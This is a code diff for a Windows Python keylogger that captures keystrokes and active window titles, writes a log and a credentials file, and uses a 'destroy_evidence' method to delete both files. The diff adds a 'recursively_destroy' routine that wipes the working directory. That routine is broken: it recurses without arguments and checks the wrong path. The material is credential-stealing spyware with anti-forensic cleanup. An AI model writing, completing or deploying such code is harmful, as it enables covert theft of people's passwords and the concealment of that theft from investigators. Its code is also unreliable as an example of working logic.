@@ -1,7 +1,7 @@
 from multiprocessing import Queue # needed for compilation
 from pynput.keyboard import Key, Listener
 from win32gui import GetWindowText, GetForegroundWindow
-from os import getcwd, remove
+import os
 from sys import argv
 from shutil import rmtree
 import logging
@@ -51,15 +51,22 @@ class Logger:
     
     def destroy_evidence(self):
         logging.shutdown()
-        remove(log_file)
-        remove(cred_file)
-        val = win32file.MoveFileEx((getcwd() + r'\build'), None ,
-                 win32file.MOVEFILE_DELAY_UNTIL_REBOOT)
-        print(val)
+        os.remove(log_file)
+        os.remove(cred_file)
+        recursively_destroy(os.getcwd())
+        #var = win32file.MoveFileEx((os.getcwd() + r'\build'), None ,
+        #        win32file.MOVEFILE_DELAY_UNTIL_REBOOT)
+        #rint(var)
         #ctypes.windll.kernel32.MoveFileExA((getcwd() + r'\build'), None,
         #                                    win32file.MOVEFILE_DELAY_UNTIL_REBOOT)
-
+    
+    def recursively_destroy(self, path):
+        items_to_destroy = os.listdir(path)
+        for items in items_to_destroy:
+            if(os.path.isdir(path)):
+                recursively_destroy()
         
+
 if __name__ == '__main__':
     logger = Logger(log_file, cred_file)
     logger.log_keys()
